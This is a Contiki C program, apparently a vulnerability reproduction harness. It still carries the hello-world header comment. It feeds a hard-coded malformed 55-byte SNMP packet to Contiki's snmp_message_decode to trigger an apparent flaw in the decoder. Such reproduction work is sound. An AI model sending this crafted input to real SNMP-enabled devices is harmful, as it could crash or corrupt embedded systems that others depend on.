/*
 * Copyright (c) 2006, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 *
 */

/**
 * \file
 *         A very simple Contiki application showing how Contiki programs look
 * \author
 *         Adam Dunkels <adam@sics.se>
 */

#include <stdlib.h>

#include "contiki.h"
#include "snmp-api.h"
#include "snmp-ber.h"
#include "snmp-message.h"

#include <stdio.h> /* For printf() */
/*---------------------------------------------------------------------------*/
PROCESS(hello_world_process, "SNMP Vuln Process");
AUTOSTART_PROCESSES(&hello_world_process);
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(hello_world_process, ev, data) {

  PROCESS_BEGIN();

  // Create a packet:

  snmp_packet_t pack;

  // Create header:

  snmp_header_t head;

  // Create varbinds:

  snmp_varbind_t varbinds[2];

  // Define a size:

  const uint32_t size = 55;

  // Define packet size:

  pack.used = size;

  // Allocate space:

  uint8_t in_data[55] = {0x30,0x46,0x2,0x1,0x1,0x4,0xa,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0xa0,0x35,0x2,0x4,0x30,0x35,0x3a,0x34,0x2,0x4,0x30,0x37,0x3a,0x36,0x2,0x1,0x0,0x30,0x24,0x30,0x14,0x6,0xf,0x81,0xdd,0xec,0xb6,0x1,0xff,0x7d,0x8c,0xeb,0xf9,0x8e,0x10,0x81,0xff,0x7d};

  pack.in = (uint8_t*)malloc(sizeof(uint8_t) * size);

  memcpy(pack.in, in_data, size);

  // Send to decoder function:

  snmp_message_decode(&pack, &head, varbinds);

  // printf("Done");

  exit(0);

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
